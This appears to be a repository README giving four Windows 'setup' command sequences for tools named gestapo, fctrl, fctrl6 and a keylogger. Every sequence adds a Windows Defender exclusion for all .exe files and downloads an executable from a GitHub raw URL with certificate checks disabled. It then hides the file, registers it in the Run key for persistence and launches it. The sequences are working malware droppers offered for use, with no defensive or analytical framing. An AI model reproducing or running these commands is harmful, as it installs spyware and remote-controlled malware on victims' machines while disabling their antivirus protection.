# public
gestapo setup
```
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/emit_latest.exe --insecure --output %appdata%\emit.exe
attrib +s +h +a %appdata%\emit.exe
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Gestapo" /d "%appdata%\emit.exe --aeskey fe333581d9f246ee" /f
cmd.exe /C start %appdata%\emit.exe --aeskey fe333581d9f246ee
exit
```
fctrl (latest) setup
```
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/fctrl.exe --insecure --output %appdata%\fctrl.exe
attrib +s +h +a %appdata%\fctrl.exe
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl" /d %appdata%\fctrl.exe /f
cmd.exe /C start %appdata%\fctrl.exe
exit
```
fctrl6 setup
```
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/fctrl6.exe --insecure --output %appdata%\fctrl6.exe
attrib +s +h +a %appdata%\fctrl6.exe
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl6" /d %appdata%\fctrl6.exe /f
cmd.exe /C start %appdata%\fctrl6.exe
exit
```
keylooger setup
```
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/logger-online.exe --insecure --output %appdata%\logger-online.exe
attrib +s +h +a %appdata%\logger-online.exe
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "keylogger" /d %appdata%\logger-online.exe /f
cmd.exe /C start %appdata%\logger-online.exe
exit
```
